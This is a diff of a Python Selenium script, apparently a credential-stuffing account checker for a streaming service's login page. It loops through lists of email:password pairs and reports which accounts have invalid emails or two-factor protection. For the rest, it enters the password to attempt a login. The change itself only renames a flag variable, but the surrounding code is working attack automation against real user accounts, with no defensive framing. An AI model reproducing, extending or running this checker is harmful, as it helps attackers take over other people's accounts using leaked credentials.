@@ -43,13 +43,13 @@ while index != len(users):
 				email_error = browser.find_element_by_xpath('/html/body/div[3]/div/div/h4').text
 				if "We couldn't find an account for that email" in str(email_error):
 					print(' | {}:{} ---> Invalid Email'.format(users[index],passwords[index]))
-					Two_Factor = True
+					error_on_first_page = True
 			if browser.find_elements_by_xpath('//*[@id="onboarding_index"]/div/div/form/h3'):
 				two_factor_authentication = browser.find_element_by_xpath('//*[@id="onboarding_index"]/div/div/form/h3').text
 				if 'Check your email inbox' in str(two_factor_authentication):
 					print(" | {}:{} ---> Protected by Two-Factor Authentication".format(users[index],passwords[index]))
-					Two_Factor = True
-			if Two_Factor != True:
+					error_on_first_page = True
+			if error_on_first_page != True:
 				password_input_box = browser.find_element_by_xpath('//*[@id="password"]')
 				login_button = browser.find_element_by_xpath('//*[@id="dssLogin"]/div/button')
 				password_input_box.send_keys(passwords[index])
